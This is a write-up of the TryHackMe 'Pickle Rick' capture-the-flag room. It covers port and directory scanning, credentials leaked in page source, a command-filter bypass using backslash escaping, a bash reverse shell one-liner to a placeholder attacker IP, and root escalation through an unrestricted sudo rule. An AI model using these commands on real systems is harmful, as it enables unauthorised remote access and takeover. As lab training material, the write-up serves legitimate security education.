# THM - Pickle Rick Writeup

> Mario Raciti | Sep 30, 2020
>
> TryHackMe CTF Room: https://tryhackme.com/room/picklerick

### A Rick and Morty CTF. Help turn Rick back into a human!

This Rick and Morty themed challenge requires you to exploit a webserver to find 3 ingredients that will help Rick make his potion to transform himself back into a human from a pickle.

There is only one task, indicating that we have to get three ingredients (flags). So without any further ado, let's begin our game!

## Nmap Scan

Let's start this room by running a classic nmap scan:

```sh
$ nmap -sC -sV $IP -oN logs/nmap

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 00:01 CEST
Nmap scan report for 10.10.166.156
Host is up (0.068s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1b:e2:11:5e:45:4a:75:91:cb:d5:ec:00:2a:1d:cf:65 (RSA)
|   256 1b:78:9f:27:b3:aa:16:c2:b4:c6:be:f8:d2:61:7f:ba (ECDSA)
|_  256 b4:66:1e:a1:27:d3:3c:cc:e1:38:44:f4:79:3c:9e:81 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.51 seconds
```

Well, it seems we have only two open ports: `22 (SSH)` and `80 (HTTP)`.

## Web Directories Enumeration

Let's start by visiting the homepage of the web server listening on port 80. By inspecting the source page, we can notice that it contains the following comment at the footer:

```html
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

Thus, we can guess that a candidate username for a login could be `R1ckRul3s`.

Now let's give a look if the web server provides a `robots.txt` file:

```
GET http://$IP/robots.txt

Wubbalubbadubdub
```

Okay maybe `Wubbalubbadubdub` could be a password (?), that is funny though. Furthermore, by trying to discover some admin page, we can find a login page at the `/login.php`endpoint.

### Gobuster

Since we didn't find any useful information apart from the login page, let's enumerate directories using Gobuster with the [common.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/common.txt) list:

```sh
$ gobuster dir --url $IP -w common.txt -o logs/gobuster.log

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.166.156
[+] Threads:        10
[+] Wordlist:       common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/01 00:13:36 Starting gobuster
===============================================================
/assets (Status: 301)
===============================================================
2020/10/01 00:13:49 Finished
===============================================================
```

As we can see, the tool found only one directory: `/assets`. Therefore we can investigate on that:

```
GET http://$IP/assets/

Parent Directory	 	-	 
bootstrap.min.css	2019-02-10 16:37	119K	 
bootstrap.min.js	2019-02-10 16:37	37K	 
fail.gif	2019-02-10 16:37	49K	 
jquery.min.js	2019-02-10 16:37	85K	 
picklerick.gif	2019-02-10 16:37	222K	 
portal.jpg	2019-02-10 16:37	50K	 
rickandmorty.jpeg	2019-02-10 16:37	488K	 
```

It seems that we found some... rubbish!

## First ingredient

Let's try the `R1ckRul3s:Wubbalubbadubdub` login combination in the portal login page found at `$IP/login.php`.

Bingo! We have access to the command panel. Thus, we can try to execute an ls command to see if there is something interesting:

```sh
$ ls

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

We can try to read the content of `Sup3rS3cretPickl3Ingred.txt`:

```sh
$ cat Sup3rS3cretPickl3Ingred.txt

Command disabled to make it hard for future PICKLEEEE RICCCKKKK
```

Damn. But we can bypass that by escaping every char with a backslash:

```sh
$ \c\a\t Sup3rS3cretPickl3Ingred.txt

***first_ingredient***
```

## Second ingredient

Let's read the content of the `clue.txt` file:

```sh
$ \c\a\t clue.txt

Look around the file system for the other ingredient.
```

Since we can perform command injections, we can try to get a reverse shell. Firstly, we can run netcat and make it listen on port 4444, then we can simply execute the following in the command panel webpage:

```sh
$ bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"
```

And voilà! We got a reverse shell:

```sh
$ nc -lvnp 4444

Connection from 10.10.166.156:56724
bash: cannot set terminal process group (1341): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-166-156:/var/www/html$ 
```

Now we can go in the home directory and find the second ingredient in Rick's home:

```sh
www-data@ip-10-10-166-156:/var/www/html$ cd ../../home
cd ../../home
bash: cd: ../../home: No such file or directory
www-data@ip-10-10-166-156:/var/www/html$ cd ../../../home
cd ../../../home
www-data@ip-10-10-166-156:/home$ ls
ls
rick
ubuntu
www-data@ip-10-10-166-156:/home$ cd rick
cd rick
www-data@ip-10-10-166-156:/home/rick$ ls
ls
second ingredients
www-data@ip-10-10-166-156:/home/rick$ cat *
cat *
***second_ingredient***
```

## Third ingredient

In order to get the latest ingredient we have to elevate our privileges. Let's check out a `sudo -l` for our current user, `www-data`:

```sh
www-data@ip-10-10-166-156:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on
    ip-10-10-166-156.eu-west-1.compute.internal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on
        ip-10-10-166-156.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

Well, easy peasy! It seems that the user `www-data` is allowed to perform all commands as root. We can finally get the third ingredient:

```sh
www-data@ip-10-10-166-156:/var/www/html$ sudo su
sudo su
/bin/bash -i
bash: cannot set terminal process group (1341): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-10-166-156:/var/www/html# cd 
cd
root@ip-10-10-166-156:~# ls 
ls 
3rd.txt
snap
root@ip-10-10-166-156:~# cat 3rd.txt
cat 3rd.txt
***third_ingredient***
```

---

### That's all folks!
